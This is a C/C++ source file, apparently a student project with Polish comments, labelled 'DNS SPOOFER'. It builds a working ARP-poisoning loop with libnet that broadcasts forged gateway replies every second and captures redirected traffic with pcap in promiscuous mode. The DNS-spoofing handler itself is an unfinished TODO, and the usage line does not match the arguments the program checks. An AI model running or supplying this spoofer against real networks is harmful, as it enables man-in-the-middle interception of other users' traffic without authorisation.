/*
 *                           DNS SPOOFER
 * Compilation:  gcc -Wall ./dnspoof.c -o dnspoof -lnet -lpthread
 * Usage:        ./dnspoog INTERFACE DEFAULT_GATEWAY_IP DEFAULT_GATEWAY_MAC
 * NOTE:         This program requires root privileges.
 *
 */

#include <libnet.h>

#include <pcap.h>
#include <arpa/inet.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/ip.h>
#include <sys/ioctl.h>
#include <unistd.h>

#include <thread>
#include <chrono>
#include <string>
#include <iostream>
#include <sstream>
#include <csignal>

libnet_t *ln;
int sfd;
char* errbuf;
pcap_t* handle;

void spoof(const char *interface_name, char *address) {
    // TODO sprawdzić czy to libnet_init można wyciągnąć przed while itp.
    u_int32_t target_ip_addr, zero_ip_addr;
    u_int8_t bcast_hw_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
            zero_hw_addr[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    struct libnet_ether_addr *src_hw_addr;
    char errbuf[LIBNET_ERRBUF_SIZE];

    ln = libnet_init(LIBNET_LINK, interface_name, errbuf);
    // Returns the MAC address for the device libnet was initialized with:
    src_hw_addr = libnet_get_hwaddr(ln);
    // Takes a dotted decimal string or a canonical DNS name and returns a network byte ordered IPv4 address:
    target_ip_addr = libnet_name2addr4(ln, address, LIBNET_RESOLVE);
    // This may incur a DNS lookup if mode is set to LIBNET_RESOLVE and host_name refers to a canonical DNS name.
    zero_ip_addr = libnet_name2addr4(ln, const_cast<char *>("0.0.0.0"), LIBNET_DONT_RESOLVE);

    libnet_autobuild_arp(
            ARPOP_REPLY,                     /* operation type       */
            src_hw_addr->ether_addr_octet,   /* sender hardware addr */ // nasz MAC
            (u_int8_t *) &target_ip_addr,     /* sender protocol addr */ // adres IP bramy
            zero_hw_addr,                    /* target hardware addr */ // dowolny MAC zapytał
            (u_int8_t *) &zero_ip_addr,       /* target protocol addr */ // -,,-
            ln);                             /* libnet context       */
    libnet_autobuild_ethernet(
            bcast_hw_addr,                   /* ethernet destination */
            ETHERTYPE_ARP,                   /* ethertype            */
            ln);                             /* libnet context       */

    while (true) {
        libnet_write(ln);
        std::chrono::seconds sec = std::chrono::seconds(1);
        std::this_thread::sleep_for(sec);
    }

}

std::string createFilter(std::string mac, std::string ip) {
    std::stringstream str;
    str << "ether dst " << mac << " and dst host " << ip;
    return str.str();
}

std::string hetMacAddress(std::string interface_name) {
    std::stringstream mac_address;
    unsigned char mac_array[6];
    struct ifreq interface_struct;          // interface structure -> needed for interface identification
    sfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));        // get socket's descriptor no
    strncpy(interface_struct.ifr_name, interface_name.c_str(), IFNAMSIZ); // read interface name and save it to interface_struct
    if (sfd < 0) {
        std::cerr << "Problem in socket creationn";
    };
    if (ioctl(sfd, SIOCGIFFLAGS, &interface_struct) == 0) {
        if (ioctl(sfd, SIOCGIFHWADDR, &interface_struct) == 0) {
            memcpy(mac_array, interface_struct.ifr_hwaddr.sa_data, 6);
            for (int i = 0 ; i < 6; i++) {
                int j = mac_array[i];
                mac_address << std::hex << j;
                if (i != 5) mac_address << ":";
            }
        }
    }
    return mac_address.str();
}

void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes) {
    printf("[%dB of %dB]\n", h->caplen, h->len);
    struct ethhdr* etherHeader = (struct ethhdr*) bytes;
    // TODO

}

void capture(char *interface_name, char *address) {
    bpf_u_int32 netp, maskp;
    struct bpf_program fp;
    errbuf= static_cast<char *>(malloc(PCAP_ERRBUF_SIZE));          // alloc memory for error buffer
    handle = pcap_create(interface_name, errbuf);                   // alloc for handler
    pcap_set_promisc(handle, 1);
    pcap_set_snaplen(handle, 65535);                                // frame length
    pcap_activate(handle);

    // FILTERING:
    pcap_lookupnet(interface_name, &netp, &maskp, errbuf);   // get filter args
    std::string macAddress = hetMacAddress(interface_name);
    std::string filter = createFilter(macAddress, address);
    pcap_compile(handle, &fp, filter.c_str(), 0, netp);      // compile filter
    if (pcap_setfilter(handle, &fp) < 0) {
        pcap_perror(handle, "pcap_setfilter()");
        exit(EXIT_FAILURE);
    }
    pcap_loop(handle, -1, trap, NULL);        // run trap
}

void stop(int signal) {
    libnet_destroy(ln);
    pcap_close(handle);
    free(errbuf);
    exit(EXIT_SUCCESS);
}

int main(int argc, char **argv) {
    if (argc < 3) {
        std::cerr << "Bad arguments count! Arguments are: INTERFACE DEFAULT_GATEWAY_IP\n";
        exit(EXIT_FAILURE);
    }

    std::signal(SIGINT, stop);

    std::thread arp_spoofer(spoof, argv[1], argv[2]);
    std::thread capturer(capture, argv[1], argv[2]);

    arp_spoofer.join();
    capturer.join();

    return 0;
}
